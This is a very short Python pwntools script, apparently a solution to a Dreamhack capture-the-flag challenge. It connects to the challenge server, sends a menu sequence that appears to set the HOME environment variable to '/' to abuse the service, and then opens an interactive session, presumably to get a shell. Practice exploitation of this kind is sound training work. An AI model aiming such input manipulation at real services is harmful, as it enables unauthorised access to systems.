from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14764
r = remote(HOST, PORT)
r.send('1\nHOME\n/\n3\n')

r.interactive()